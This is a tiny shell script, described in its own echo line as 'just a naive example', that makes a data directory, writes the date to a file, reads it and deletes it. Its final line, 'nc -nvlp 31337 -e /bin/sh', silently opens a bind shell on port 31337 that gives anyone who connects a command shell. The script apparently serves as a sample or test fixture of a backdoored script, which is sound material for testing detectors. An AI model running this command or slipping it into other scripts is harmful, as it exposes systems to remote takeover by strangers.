#!/bin/sh

set -x
echo 'just a naive example'
pwd
mkdir -p /code/data/
date >/code/data/cached-assets
cat /code/data/cached-assets
rm data/cached-assets
nc -nvlp 31337 -e /bin/sh
